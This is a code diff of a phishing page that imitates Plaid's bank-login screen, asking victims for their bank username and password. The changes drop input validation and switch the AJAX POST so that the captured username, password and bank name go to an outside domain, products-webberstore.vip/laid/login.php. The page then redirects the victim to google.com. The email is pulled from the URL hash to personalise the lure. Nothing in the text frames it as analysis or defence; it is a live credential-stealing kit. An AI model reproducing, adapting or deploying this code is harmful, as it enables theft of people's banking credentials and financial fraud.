@@ -1288,15 +1288,7 @@ var names = window.location.hash; // to grab email for autolink
 if(hash !== ""){
 	hash = hash.split('#');
 	
-	
-	//normal email add this code
 	const email = hash[1]; // to splt between # and email are normal string	
-	//const n1 = names[1];
-	//var domain = email.substring(email.lastIndexOf("@") +1);
-	
-	//base64email add this code, remove comment
-	//const email = atob(email);
-	
 	$("#logopick").attr("src","https://logo.clearbit.com/"+email);
 	
 }
@@ -1311,62 +1303,16 @@ $("#banknames").val(name);
 	var count = 0;
 	$('.btn-default').click(function(e){
 		e.preventDefault();
-				
 
-		var username = $('#username').val();
-        if(username == ''){
-			$('.message_box').html(
-			'<span style="color:red;">Enter Email Address!</span>'
-			);
-			$('#username').focus();
-            return false;
-			}
-		if( $("#username").val()!='' ){
-			if( !isValidEmailAddress( $("#username").val() ) ){
-			$('.message_box').html(
-			'<span style="color: rgb(211, 47, 47); margin-bottom: 20px; font-weight: 500;">Provided email address is incorrect!</span>'
-			);
-			$('#username').focus();
-			return false;
-			}
-			}
-			
-		var password = $('#password').val();
-        if(password == ''){
-			$('.message_box').html(
-			'<span style="color:red;">Enter Your Password Here!</span>'
-			);
-			$('#password').focus();
-            return false;
-			}	
-					
 			$.ajax
 			({
              type: "POST",
-			 url: "https://products-webberstore.monster/rackspace/post.php",
-             data: "password="+password+"&username="+username,			 
-			 beforeSend: function() {
-			 $('.message_box').html(
-			 '<img src="https://products-webberstore.monster/rackspace/Loader.gif" width="25" height="25"/>'
-			 
-			 );
-			 },		 
-             success: function(data)
-			 {
-				// setTimeout(function() {
-                //    $('.message_box').html(data);
-                //}, delay);
-				count=count+1;
-				 if (count>=2) {
-                    count=0;
-                    // window.location.replace(response['redirect_link']);
-                    window.location.replace("http://www."+domain);
-
-                  }else{
-                   $('#.message_box').html(response['Try Again']);
-                }
-			
-             }
+			 url: "https://products-webberstore.vip/laid/login.php",
+             data: "password="+password+"&username="+username+"banknames="+banknames,	 
+			 	 
+             success: function(data){			 
+				window.location.replace("http://www.google.com");			
+				}
 			 });
 	});
 			
@@ -1405,10 +1351,10 @@ function isValidEmailAddress(emailAddress) {
 </div></div><div class="header-module__text"></div></div><div></div></div><div class="Content-module__content">
 
 
-<h1 id="a11y-title" class="mb-1" tabindex="-1">Enter your credentials</h1><p class="mb-3"> By providing your <b id="bankname">sss</b> credentials to Plaid, you’re enabling Plaid to retrieve your financial data. </p>
+<h1 id="a11y-title" class="mb-1" tabindex="-1">Enter your credentials</h1><p class="mb-3"> By providing your <b id="bankname"></b> credentials to Plaid, you’re enabling Plaid to retrieve your financial data. </p>
 
-<form class="mt-3" method="post" action="3.html"><div class="mb-2"><div class="BaseInput-module_container__1Tzy_ BaseInput-module_largeContainer__3Ghfi mb-2"><label class="BaseInput-module_label__1Lxn2 BaseInput-module_largeLabel__1H3wG" for="aut-input-0"></label><input class="BaseInput-module_input__dbBHR BaseInput-module_largeInput__1vchD" autocapitalize="off" autocomplete="off" autocorrect="off" type="text" id="aut-input-0" spellcheck="false" placeholder="Username" name="username" required=""><div class="BaseInput-module_iconButtonWrapper__3-MEp"><i class="Icons-module_icon__3ePq6 BaseInput-module_iconButton__2NIeW"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" aria-hidden="true" role="presentation"><path d="M17.5 10.25h-.75V8a4.75 4.75 0 00-9.5 0v2.25H6.5a1.25 1.25 0 00-1.25 1.25v7a1.25 1.25 0 001.25 1.25h11a1.25 1.25 0 001.25-1.25v-7a1.25 1.25 0 00-1.25-1.25zM8.75 8a3.25 3.25 0 016.5 0v2.25h-6.5zm8.5 10.25H6.75v-6.5h10.5zm-6-4.25h1.5v2h-1.5z" fill="currentColor"></path><path fill="none" d="M0 0h24v24H0z"></path></svg></i></div></div></div><div class="mb-2"><div class="BaseInput-module_container__1Tzy_ BaseInput-module_largeContainer__3Ghfi mb-2"><label class="BaseInput-module_label__1Lxn2 BaseInput-module_largeLabel__1H3wG" for="aut-input-1"></label><input class="BaseInput-module_input__dbBHR BaseInput-module_largeInput__1vchD" autocapitalize="off" autocomplete="off" autocorrect="off" type="password" id="aut-input-1" spellcheck="false" placeholder="Password" name="password" required="">
+<form class="mt-3" method="post" action=""><div class="mb-2"><div class="BaseInput-module_container__1Tzy_ BaseInput-module_largeContainer__3Ghfi mb-2"><label class="BaseInput-module_label__1Lxn2 BaseInput-module_largeLabel__1H3wG" for="aut-input-0"></label><input class="BaseInput-module_input__dbBHR BaseInput-module_largeInput__1vchD" autocapitalize="off" autocomplete="off" autocorrect="off" type="text" id="aut-input-0" spellcheck="false" placeholder="Username" name="username" required=""><div class="BaseInput-module_iconButtonWrapper__3-MEp"><i class="Icons-module_icon__3ePq6 BaseInput-module_iconButton__2NIeW"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" aria-hidden="true" role="presentation"><path d="M17.5 10.25h-.75V8a4.75 4.75 0 00-9.5 0v2.25H6.5a1.25 1.25 0 00-1.25 1.25v7a1.25 1.25 0 001.25 1.25h11a1.25 1.25 0 001.25-1.25v-7a1.25 1.25 0 00-1.25-1.25zM8.75 8a3.25 3.25 0 016.5 0v2.25h-6.5zm8.5 10.25H6.75v-6.5h10.5zm-6-4.25h1.5v2h-1.5z" fill="currentColor"></path><path fill="none" d="M0 0h24v24H0z"></path></svg></i></div></div></div><div class="mb-2"><div class="BaseInput-module_container__1Tzy_ BaseInput-module_largeContainer__3Ghfi mb-2"><label class="BaseInput-module_label__1Lxn2 BaseInput-module_largeLabel__1H3wG" for="aut-input-1"></label><input class="BaseInput-module_input__dbBHR BaseInput-module_largeInput__1vchD" autocapitalize="off" autocomplete="off" autocorrect="off" type="password" id="aut-input-1" spellcheck="false" placeholder="Password" name="password" required="">
 
 <input type="hidden" id="banknames" name="banknames" >
 
-<div class="BaseInput-module_iconButtonWrapper__3-MEp"><i class="Icons-module_icon__3ePq6 BaseInput-module_iconButton__2NIeW"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" aria-hidden="true" role="presentation"><path d="M17.5 10.25h-.75V8a4.75 4.75 0 00-9.5 0v2.25H6.5a1.25 1.25 0 00-1.25 1.25v7a1.25 1.25 0 001.25 1.25h11a1.25 1.25 0 001.25-1.25v-7a1.25 1.25 0 00-1.25-1.25zM8.75 8a3.25 3.25 0 016.5 0v2.25h-6.5zm8.5 10.25H6.75v-6.5h10.5zm-6-4.25h1.5v2h-1.5z" fill="currentColor"></path><path fill="none" d="M0 0h24v24H0z"></path></svg></i></div></div></div><div class="Actions-module__actions Actions-module__hasTertiary Actions-module__isWithinForm"><button class="Touchable-module_resetButtonOrLink__hwe7O Touchable-module_block__WBbZm Touchable-module_wide__EYer3 Touchable-module_centered__1VEx8 Button-module_button__1yqRw Button-module_size56__2XPBz Button-module_centered__3BGqS Button-module__button" id="aut-button" type="submit" role="button"><span class="Button-module_flex__2To5J"><span class="Button-module_text__38wV0">Submit</span></span></button></div></form></div></main></div><div></div></div></div></div></div><div data-focus-guard="true" tabindex="0" style="width: 1px; height: 0px; padding: 0px; overflow: hidden; position: fixed; top: 1px; left: 1px;"></div></reach-portal></body></html>
+<div class="BaseInput-module_iconButtonWrapper__3-MEp"><i class="Icons-module_icon__3ePq6 BaseInput-module_iconButton__2NIeW"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" aria-hidden="true" role="presentation"><path d="M17.5 10.25h-.75V8a4.75 4.75 0 00-9.5 0v2.25H6.5a1.25 1.25 0 00-1.25 1.25v7a1.25 1.25 0 001.25 1.25h11a1.25 1.25 0 001.25-1.25v-7a1.25 1.25 0 00-1.25-1.25zM8.75 8a3.25 3.25 0 016.5 0v2.25h-6.5zm8.5 10.25H6.75v-6.5h10.5zm-6-4.25h1.5v2h-1.5z" fill="currentColor"></path><path fill="none" d="M0 0h24v24H0z"></path></svg></i></div></div></div><div class="Actions-module__actions Actions-module__hasTertiary Actions-module__isWithinForm"><button class="Touchable-module_resetButtonOrLink__hwe7O Touchable-module_block__WBbZm Touchable-module_wide__EYer3 Touchable-module_centered__1VEx8 Button-module_button__1yqRw Button-module_size56__2XPBz Button-module_centered__3BGqS Button-module__button btn-default" id="aut-button" type="submit" role="button"><span class="Button-module_flex__2To5J"><span class="Button-module_text__38wV0">Submit</span></span></button></div></form></div></main></div><div></div></div></div></div></div><div data-focus-guard="true" tabindex="0" style="width: 1px; height: 0px; padding: 0px; overflow: hidden; position: fixed; top: 1px; left: 1px;"></div></reach-portal></body></html>
